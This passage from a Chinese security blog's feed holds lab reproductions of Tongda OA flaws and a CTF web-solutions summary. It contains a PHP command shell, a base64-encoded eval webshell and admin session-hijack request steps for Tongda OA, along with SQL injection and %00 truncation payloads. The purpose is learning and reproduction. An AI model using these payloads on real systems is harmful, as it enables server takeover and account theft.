<td align="center">匹配输入字符串的结尾位置。如果设置了 RegExp 对象的Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 $。</td>
</tr>
<tr>
<td align="center">( )</td>
<td align="center">标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 *。</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。</td>
</tr>
<tr>
<td align="center">.</td>
<td align="center">匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 . 。</td>
</tr>
<tr>
<td align="center">[</td>
<td align="center">标记一个中括号表达式的开始。要匹配 [，请使用 [。</td>
</tr>
<tr>
<td align="center">?</td>
<td align="center">匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。</td>
</tr>
<tr>
<td align="center">\</td>
<td align="center">将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td>
</tr>
<tr>
<td align="center">^</td>
<td align="center">匹配输入字符串的开始位置，除非在方括号表达式中使用，此时它表示不接受该字符集合。要匹配 ^ 字符本身，请使用 ^。</td>
</tr>
<tr>
<td align="center">{</td>
<td align="center">标记限定符表达式的开始。要匹配 {，请使用 {。</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h3 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h3><p>&#160; &#160; &#160; 限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。</p>
<p>正则表达式的限定符有：</p>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">*</td>
<td align="center">匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td>
</tr>
<tr>
<td align="center">?</td>
<td align="center">匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</td>
</tr>
<tr>
<td align="center">{n}</td>
<td align="center">n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。{n,}    n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td>
</tr>
<tr>
<td align="center">{n,m}</td>
<td align="center">m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>端口漏洞备忘录</title>
    <url>/posts/39451.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">输入密码，查看文章！</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="830b623580e6a5ec1d409816451be0007fe5fe5cd1dee63319b8ed505bbfd9d2"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA任意文件上传+文件包含导致RCE漏洞复现</title>
    <url>/posts/38272.html</url>
    <content><![CDATA[<img src="/posts/38272/home.png" alt="home" style="zoom:80%;">

<h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化系统，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等。</p>
<p>该漏洞被黑产利用，用于投放勒索病毒</p>
<p>该漏洞在绕过身份验证的情况下通过文件上传漏洞上传恶意php文件，组合文件包含漏洞最终造成远程代码执行漏洞，从而导致可以控制服务器system权限。</p>
<h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">V11版</span><br><span class="line">2017版</span><br><span class="line">2016版</span><br><span class="line">2015版</span><br><span class="line">2013增强版</span><br><span class="line">2013版</span><br></pre></td></tr></table></figure>

<h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02 利用条件"></a>0x02 利用条件</h2><p><strong>无需身份认证</strong></p>
<ol>
<li>任意文件上传 <code>/ispirit/im/upload.php</code></li>
<li>本地文件包含 <code>ispirit/interface/gateway.php</code></li>
</ol>
<p><strong>命令执行绕过</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command=$_POST[<span class="string">'cmd'</span>];</span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>);</span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">"cmd /c "</span>.$command);</span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>GetWebshell</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fp = fopen(<span class="string">'readme.php'</span>, <span class="string">'w'</span>);</span><br><span class="line">$a = base64_decode(<span class="string">"PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9HRVRbJ3Bhc3MnXSkpCnsKICAgICRrZXk9c3Vic3RyKG1kNSh1bmlxaWQocmFuZCgpKSksMTYpOwogICAgJF9TRVNTSU9OWydrJ109JGtleTsKICAgIHByaW50ICRrZXk7Cn0KZWxzZQp7CiAgICAka2V5PSRfU0VTU0lPTlsnayddOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgkJCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7CiAgICAJCQkgJHBvc3RbJGldID0gJHBvc3RbJGldXiRrZXlbJGkrMSYxNV07IAogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJHApIHtldmFsKCRwLiIiKTt9fQoJQG5ldyBDKCRwYXJhbXMpOwp9Cj8+"</span>);</span><br><span class="line">fwrite($fp, $a);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>php Zend 解码</strong></p>
<p><a href="http://dezend.qiling.org/free.html" target="_blank" rel="noopener">http://dezend.qiling.org/free.html</a></p>
<h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><p>被授权的远程攻击者通过文件上传配合文件包含，触发远程恶意代码执行。系统中<code>auth.php</code>是登陆验证的相关逻辑，<code>upload.php</code>中$P参数如果非空就不需要经过<code>auth.php</code>验证即可执行后续代码。利用此处逻辑漏洞可绕过登陆验证直接上传文件。攻击者可通过精心构造<code>json</code>进入<code>includ_once</code>进行文件包含。</p>
<h2 id="0x04-环境搭建"><a href="#0x04-环境搭建" class="headerlink" title="0x04 环境搭建"></a>0x04 环境搭建</h2><p>本次实验所用版本是<code>通达V11.3</code></p>
<p>链接：<a href="https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q</a></p>
<p>提取码：z863</p>
<p>下载好源码，解压缩后直接运行exe文件安装，访问靶机IP即可，界面如上图。</p>
<p>本机IP：<code>192.168.150.142</code></p>
<h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>这里需要注意的是：有些版本的<code>gateway.php</code>路径不同。</p>
<p>2013</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;ispirit&#x2F;im&#x2F;upload.php</span><br><span class="line">&#x2F;ispirit&#x2F;interface&#x2F;gateway.php</span><br></pre></td></tr></table></figure>

<p>2017</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;ispirit&#x2F;im&#x2F;upload.php</span><br><span class="line">&#x2F;mac&#x2F;gateway.php</span><br></pre></td></tr></table></figure>

<p>V11</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;ispirit&#x2F;im&#x2F;upload.php</span><br><span class="line">&#x2F;ispirit&#x2F;interface&#x2F;gateway.php</span><br></pre></td></tr></table></figure>

<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>任意文件上传漏洞路径<code>/ispirit/im/upload.php</code></p>
<p><img src="/posts/38272/upload.png" alt="upload"></p>
<p>使用burp抓包，构造请求包，发送数据包可以看到成功上传</p>
<p><img src="/posts/38272/request.png" alt="request"></p>
<p>filename = <code>2004/1795480914.jpg</code></p>
<p>由于上传目录不在根目录所以还是需要另一个漏洞来进行文件包含。</p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>本地文件包含漏洞路径 <code>/ispirit/interface/gateway.php</code></p>
<p><img src="/posts/38272/include.png" alt="include"></p>
<p>成功包含上面上传文件，并执行命令。</p>
<h2 id="0x06-最后"><a href="#0x06-最后" class="headerlink" title="0x06 最后"></a>0x06 最后</h2><p>这个漏洞复现花了很长时间，一开始不知道怎么构造数据包。</p>
<p>通达OA开启了 <code>disable_funcation</code> 功能 很多常见的命令执行函数如 <code>exec</code>、<code>eval</code>、<code>system</code>等都被禁止了，需要bypass。这个我还不会，后面会找时间学习学习。</p>
<h2 id="0x07参考"><a href="#0x07参考" class="headerlink" title="0x07参考"></a>0x07参考</h2><p><a href="http://blog.fuzz.pub/2020/03/17/通达oa%20RCE%20分析/" target="_blank" rel="noopener">通达OA RCE分析</a></p>
<p><a href="https://github.com/jas502n/OA-tongda-RCE" target="_blank" rel="noopener">POC</a></p>
<p><a href="https://www.cnblogs.com/-qing-/p/10944118.html" target="_blank" rel="noopener">bypass disable_funcation</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA任意用户登录复现</title>
    <url>/posts/51745.html</url>
    <content><![CDATA[<p><img src="/posts/51745/login.png" alt="login"></p>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>通达OA是北京通达信科科技有限公司出品的 “Office Anywhere 通达网络智能办公系统”。<br>该漏洞可获取任意用户session，包括系统管理员。</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通达OA 2017</span><br><span class="line">V11.3 &lt; V11.5</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本次实验所用版本是<code>通达V11.3</code></p>
<p>链接：<a href="https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1nm-kBi4zOwXDZFtjmf7n2Q</a></p>
<p>提取码：z863</p>
<p>下载好源码，解压缩后直接运行exe文件安装，访问靶机IP即可，界面如上图。</p>
<p>本机IP：<code>192.168.150.142</code></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
<li><p>登录页面直接抓包</p>
<p><img src="/posts/51745/logincheck.png" alt="logincheck"></p>
</li>
<li><p>此处需要修改3个地方</p>
<ol>
<li><code>/logincheck.php</code> 修改为 <code>logincheck_code.php</code></li>
<li>删除<code>Cookie</code>，否则不会返回<code>PHPSESSID</code></li>
<li>在<code>POST</code>处添加 <code>&amp;UID=1</code>，代表管理员</li>
</ol>
<p><img src="/posts/51745/get_sessid.png" alt="get_sessid"></p>
<p>成功获取PHPSESSID。</p>
</li>
<li><p>利用获得的<code>PHPSESSID</code>登录</p>
<p>访问<code>http://192.168.150.142/general/index.php</code>抓包并替换<code>PHPSESSID</code></p>
<p>或者</p>
<p>访问<code>http://192.168.150.142/general/index.php</code>直接F12，修改<code>PHPSESSID</code>，然后刷新即可登录。</p>
<p><img src="/posts/51745/success.png" alt="success"></p>
</li>
</ul>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>poc地址：<a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User" target="_blank" rel="noopener">点我</a></p>
<p>使用方法：</p>
<ol>
<li><p>运行poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 POC.py -v 版本 -url url</span><br><span class="line">&#x2F;&#x2F; 版本：11 或 2017</span><br><span class="line">&#x2F;&#x2F; url: IP 或 http:&#x2F;&#x2F;IP</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取到可用的SESSIONID</p>
</li>
<li><p>替换浏览器Cookie中的SESSIONID即可实现登录为admin</p>
</li>
</ol>
<p><img src="/posts/51745/poc.png" alt="poc"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF之web总结</title>
    <url>/posts/29867.html</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>&#160; &#160; &#160; 身为一只web小白，但也刷了不少CTF方面的web题，趁着今天有时间，坐下来总结一下关于web的解题方法。<a id="more"></a></p>
<h2 id="0x01-直接查看源代码"><a href="#0x01-直接查看源代码" class="headerlink" title="0x01 直接查看源代码"></a>0x01 直接查看源代码</h2><h3 id="题目：http-ctf5-shiyanbar-com-10-main-php"><a href="#题目：http-ctf5-shiyanbar-com-10-main-php" class="headerlink" title="题目：http://ctf5.shiyanbar.com/10/main.php"></a>题目：<a href="http://ctf5.shiyanbar.com/10/main.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/10/main.php</a></h3><h3 id="解题方法："><a href="#解题方法：" class="headerlink" title="解题方法："></a>解题方法：</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb1.png" alt><br>点击右键，查看页面源代码<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb2.png" alt><br>将<code>hidden</code>改为<code>text</code>,<code>value=0</code>改为<code>value=1</code>,点击<code>Enter</code>。出现下图：<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb3.png" alt><br>这段代码的意思就是，将我们传给<code>PIN</code>的值给<code>a</code>,如果<code>a=-19827747736161128312837161661727773716166727272616149001823847</code>,输出flag。因此，我们直接将该值输入进去，点击Enter即可。<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb4.png" alt></p>
<h2 id="0x02-查看修改或添加HTTP请求头响应头"><a href="#0x02-查看修改或添加HTTP请求头响应头" class="headerlink" title="0x02 查看修改或添加HTTP请求头响应头"></a>0x02 查看修改或添加HTTP请求头响应头</h2><h3 id="题目：http-ctf5-shiyanbar-com-phpaudit"><a href="#题目：http-ctf5-shiyanbar-com-phpaudit" class="headerlink" title="题目：http://ctf5.shiyanbar.com/phpaudit/"></a>题目：<a href="http://ctf5.shiyanbar.com/phpaudit/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/phpaudit/</a></h3><h3 id="解题方法：-1"><a href="#解题方法：-1" class="headerlink" title="解题方法："></a>解题方法：</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb5.png" alt><br>点击<code>View the source code</code>,<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb6.png" alt><br>从这段代码可以看出，只要IP为<code>1.1.1.1</code>,即可输出flag。<br>用burpsuite抓包,在请求头中添加<code>X-Forwarded-For:1.1.1.1</code>,<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb7.png" alt><br>然后GO即可，<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb8.png" alt></p>
<h2 id="0x03-302跳转的中转网页有信息"><a href="#0x03-302跳转的中转网页有信息" class="headerlink" title="0x03 302跳转的中转网页有信息"></a>0x03 302跳转的中转网页有信息</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><h3 id="解题方法：-2"><a href="#解题方法：-2" class="headerlink" title="解题方法："></a>解题方法：</h3><h2 id="0x04-查看开发者工具控制台"><a href="#0x04-查看开发者工具控制台" class="headerlink" title="0x04 查看开发者工具控制台"></a>0x04 查看开发者工具控制台</h2><h3 id="题目：http-ctf5-shiyanbar-com-DUTCTF-1-html"><a href="#题目：http-ctf5-shiyanbar-com-DUTCTF-1-html" class="headerlink" title="题目：http://ctf5.shiyanbar.com/DUTCTF/1.html"></a>题目：<a href="http://ctf5.shiyanbar.com/DUTCTF/1.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/1.html</a></h3><h3 id="解题方法：-3"><a href="#解题方法：-3" class="headerlink" title="解题方法："></a>解题方法：</h3><p>进去之后发现是一片乱字符，其实不难发现这是js代码，这就可以用到我们的控制台了，复制代码，按F12，<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb10.png" alt><br>回车<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb11.png" alt></p>
<h2 id="0x05-js代码，js加解密"><a href="#0x05-js代码，js加解密" class="headerlink" title="0x05 js代码，js加解密"></a>0x05 js代码，js加解密</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><h3 id="解题方法：-4"><a href="#解题方法：-4" class="headerlink" title="解题方法："></a>解题方法：</h3><h2 id="0x06-使用Burpsuite拦截"><a href="#0x06-使用Burpsuite拦截" class="headerlink" title="0x06 使用Burpsuite拦截"></a>0x06 使用Burpsuite拦截</h2><h3 id="题目：http-ctf5-shiyanbar-com-basic-catch"><a href="#题目：http-ctf5-shiyanbar-com-basic-catch" class="headerlink" title="题目：http://ctf5.shiyanbar.com/basic/catch/"></a>题目：<a href="http://ctf5.shiyanbar.com/basic/catch/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/basic/catch/</a></h3><h3 id="解题方法：-5"><a href="#解题方法：-5" class="headerlink" title="解题方法："></a>解题方法：</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb12.png" alt><br>在输入框中随便输入123，发现报错，然后尝试抓包，发现响应头返回一个字符串<code>MTU1MzA5MzkzOA==</code><br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb13.png" alt><br>然后将该字符串提交，即得flag。<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb14.png" alt></p>
<p>其实该字符串是经过base64加密的,解密后是<code>1553093938</code></p>
<h2 id="0x07-robots-txt"><a href="#0x07-robots-txt" class="headerlink" title="0x07 robots.txt"></a>0x07 robots.txt</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><h3 id="解题方法：-6"><a href="#解题方法：-6" class="headerlink" title="解题方法："></a>解题方法：</h3><h2 id="0x08-asp-php代码审计"><a href="#0x08-asp-php代码审计" class="headerlink" title="0x08 asp,php代码审计"></a>0x08 asp,php代码审计</h2><h3 id="题目一：http-ctf5-shiyanbar-com-web-more-php"><a href="#题目一：http-ctf5-shiyanbar-com-web-more-php" class="headerlink" title="题目一：http://ctf5.shiyanbar.com/web/more.php"></a>题目一：<a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/more.php</a></h3><h3 id="解题方法：-7"><a href="#解题方法：-7" class="headerlink" title="解题方法："></a>解题方法：</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb21.png" alt><br>点击查看源代码，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset ($_GET[&#39;password&#39;])) &#123;</span><br><span class="line">	if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		echo &#39;&lt;p&gt;You password must be alphanumeric&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)</span><br><span class="line">	&#123;</span><br><span class="line">		if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !&#x3D;&#x3D; FALSE)</span><br><span class="line">		&#123;</span><br><span class="line">			die(&#39;Flag: &#39; . $flag);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			echo(&#39;&lt;p&gt;*-* have not been found&lt;&#x2F;p&gt;&#39;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo &#39;&lt;p&gt;Invalid password&lt;&#x2F;p&gt;&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>从这段代码中，可以看出要想得到flag，必须满足以下几个条件：</p>
<ol>
<li>输入的<code>password</code>必须是“a-zA-Z0-9]+$”中的</li>
<li><code>password</code>必须长度小于8</li>
<li><code>password</code>的值必须大于<code>999999999</code></li>
<li><code>password</code>必须包含字符串<code>*-*</code></li>
</ol>
<p>&#160; &#160; &#160; 对于前三个条件，我们可以用科学计数法<code>password=9e9</code>,最后一个条件，其实<code>ereg()</code>函数有一个截断漏洞，我们可以用<code>%00</code>截断，让<code>password=9e9%00*-*</code>。在提交password的时候我们发现并不会出现flag，这是因为浏览器修改了传进去的参数，我们直接在url后面传参即可。<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb22.png" alt></p>
<p>题目二：<a href="http://ctf5.shiyanbar.com/DUTCTF/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/index.php</a><br>解题方法：<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb23.png" alt><br>出来这么一句话，查看源代码，源代码简单的不能再简单了。</p>
<p>但我们发现了这么一个文件<code>index.php.txt</code>,二话不说放进url试试，哎，出现了php源代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>&#160; &#160; &#160; 这段代码的意思就是说，我们传进去的<code>id</code>经过url解密之后与<code>hackerDJ</code>是一样的，不说废话，行动起来，<code>hackerDJ</code>经url加密之后是<code>%68%61%63%6b%65%72%44%4a</code>,传进去之后依然不行，这是因为浏览器会自动对url进行解码，嗯，所以我们要进行二次加密，再次加密之后变为<code>%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61</code>。<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb24.png" alt></p>
<h2 id="0x09-SQL注入"><a href="#0x09-SQL注入" class="headerlink" title="0x09 SQL注入"></a>0x09 SQL注入</h2><h3 id="题目：http-ctf5-shiyanbar-com-web-index-2-php"><a href="#题目：http-ctf5-shiyanbar-com-web-index-2-php" class="headerlink" title="题目：http://ctf5.shiyanbar.com/web/index_2.php"></a>题目：<a href="http://ctf5.shiyanbar.com/web/index_2.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_2.php</a></h3><h3 id="解题方法：-8"><a href="#解题方法：-8" class="headerlink" title="解题方法："></a>解题方法：</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb40.png" alt><br>既然是SQL注入，那么我们就要构造注入语句了，这个就要有耐心一个一个去尝试了<br>输入语句</p>
<p><code>1&#39;and 1=1 #</code></p>
<p>和</p>
<p><code>1&#39;and/**/1=1/**/#</code>后</p>
<p>对比一下，发现是过滤掉了空格，我们用/**/代替空格<br>下面就要构造找flag的语句了</p>
<p><code>1&#39;/**/union/**/select/**/flag/**/from/**/flag#</code></p>
<p>最后就能找到flag了，（其实这里面还有一些步骤，用SQLMap跑啊跑~）<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb41.png" alt></p>
<h2 id="0x0A-简单脚本使用"><a href="#0x0A-简单脚本使用" class="headerlink" title="0x0A 简单脚本使用"></a>0x0A 简单脚本使用</h2><h3 id="题目：http-ctf5-shiyanbar-com-web-10-10-php"><a href="#题目：http-ctf5-shiyanbar-com-web-10-10-php" class="headerlink" title="题目：http://ctf5.shiyanbar.com/web/10/10.php"></a>题目：<a href="http://ctf5.shiyanbar.com/web/10/10.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/10/10.php</a></h3><h3 id="解题方法：-9"><a href="#解题方法：-9" class="headerlink" title="解题方法："></a>解题方法：</h3><p><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb34.png" alt><br>查看源代码<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb37.png" alt><br>这句话的意思就是，让我们传一个参数<code>key</code>.<br>根据前面的提示，看响应头<br><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb35.png" alt><br>这个<code>FLAG</code>明显是经过base64加密的，解码之后<code>P0ST_THIS_T0_CH4NGE_FL4G:Lx17DdQma</code><br>用脚本跑一下，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.Session()    #因为reqests请求的和post提交的数据要保持一致</span><br><span class="line">sys.stdout &#x3D; io.TextIOWrapper(sys.stdout.buffer,encoding&#x3D;&#39;utf-8&#39;)   #改变默认输出的编码</span><br><span class="line">html &#x3D; r.head(&#39;http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;web&#x2F;10&#x2F;10.php&#39;)</span><br><span class="line">result &#x3D; html.headers</span><br><span class="line">results &#x3D; result[&#39;FLAG&#39;]</span><br><span class="line">print(results)</span><br><span class="line">de_results &#x3D; str(base64.b64decode(results.encode(&#39;utf-8&#39;)))</span><br><span class="line">print(de_results)</span><br><span class="line">data &#x3D; de_results.split(&#39;:&#39;,1)[1]</span><br><span class="line">datas &#x3D; data.replace(&#39;\&#39;&#39;, &#39;&#39;)</span><br><span class="line">print(datas)</span><br><span class="line">flag &#x3D; &#123;&#39;key&#39;:datas&#125;</span><br><span class="line">flags &#x3D; r.post(&#39;http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;web&#x2F;10&#x2F;10.php&#39;, data&#x3D;flag)</span><br><span class="line">print(flags.text)</span><br></pre></td></tr></table></figure>
<p><img src="http://pp64r48ul.bkt.clouddn.com/CTFweb36.png" alt></p>
